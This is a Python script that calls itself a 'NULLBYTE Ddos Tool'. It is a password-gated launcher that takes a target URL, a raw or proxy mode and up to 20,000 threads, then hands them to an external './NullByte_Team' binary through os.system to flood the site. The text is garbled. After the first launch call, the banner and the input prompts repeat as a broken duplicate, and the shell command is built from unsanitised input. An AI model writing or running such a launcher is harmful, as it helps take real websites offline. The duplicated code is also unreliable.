#!/usr/bin/env python3
import os
import sys
import getpass
from colorama import Fore, Style, init

init(autoreset=True)

# Clear screen
os.system("clear" if os.name != "nt" else "cls")

# LOGIN SCREEN
print(Fore.RED + Style.BRIGHT + """
████████████████████████████████████████████
█        NULLBYTE Ddos Tool          █
████████████████████████████████████████████
█  SYSTEM STATUS : LOCKED                  █
█  ACCESS LEVEL  : RESTRICTED              █
█  SECURITY      : ACTIVE                  █
████████████████████████████████████████████
""")

print(Fore.YELLOW + "🔐 Authentication Required\n")

# PASSWORD (Hidden)
password = getpass.getpass(Fore.CYAN + "ENTER ACCESS KEY >>> ")

if password != "kaneki":
    print(Fore.RED + "\nACCESS DENIED ❌")
    sys.exit()

print(Fore.GREEN + "\nACCESS GRANTED ✓")
print(Fore.GREEN + "Welcome to NullByte Tool\n")

# MAIN BANNER
BANNER = """
███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗   ██╗████████╗███████╗
████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝
██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝ ╚████╔╝    ██║   █████╗
██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝
██║ ╚████║╚██████╔╝███████╗███████╗██████╔╝   ██║      ██║   ███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝
"""

print(Fore.RED + Style.BRIGHT + BANNER)
print(Fore.RED + "NullByte Tool\n")

# TARGET INPUT
target = input(Fore.CYAN + "Target URL → ").strip()
if not target.startswith(("http://", "https://")):
    target = "https://" + target

# MODE MENU
print(Fore.RED + "\nMode:")
print("1 — Raw")
print("2 — Proxy list\n")

choice = input(Fore.CYAN + "Choose (1/2) → ").strip()

# THREAD INPUT
threads = input(Fore.CYAN + "Threads (100-20000) → ").strip()

if not threads.isdigit():
    threads = 8000
else:
    threads = int(threads)
    if threads < 100:
        threads = 100
    if threads > 20000:
        threads = 20000

# MODE SELECT
file = ""
if choice == "2":
    mode = "proxy"
    file = input(Fore.CYAN + "Proxy file → ").strip() or "proxies.txt"
else:
    mode = "raw"

# BUILD COMMAND
cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
if file:
    cmd += f" {file}"

print(Fore.YELLOW + f"\nLAUNCHING {mode.upper()} MODE → {threads} THREADS\n")

# RUN
os.system(cmd)███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗   ██╗████████╗███████╗
████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝
██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝ ╚████╔╝    ██║   █████╗
██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝
██║ ╚████║╚██████╔╝███████╗███████╗██████╔╝   ██║      ██║   ███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝
"""

print(Fore.RED + Style.BRIGHT + BANNER)
print(Fore.RED + "NullByte Tool\n")

# TARGET INPUT
target = input(Fore.CYAN + "Target URL → ").strip()
if not target.startswith(("http://", "https://")):
    target = "https://" + target

# MODE MENU
print(Fore.RED + "\nMode:")
print("1 — Raw")
print("2 — Proxy list\n")

choice = input(Fore.CYAN + "Choose (1/2) → ").strip()
threads = input(Fore.CYAN + "Threads (100-20000) → ").strip() or "8000"

if choice == "2":
    mode = "proxy"
    file = input(Fore.CYAN + "Proxy file → ").strip() or "proxies.txt"
else:
    mode = "raw"
    file = ""

cmd = f"./NullByte_Team ULTIMATE {target} {mode} {threads}"
if file:
    cmd += f" {file}"

print(Fore.RED + f"\nLAUNCHING {mode.upper()} MODE → {threads} threads\n")
os.system(cmd)
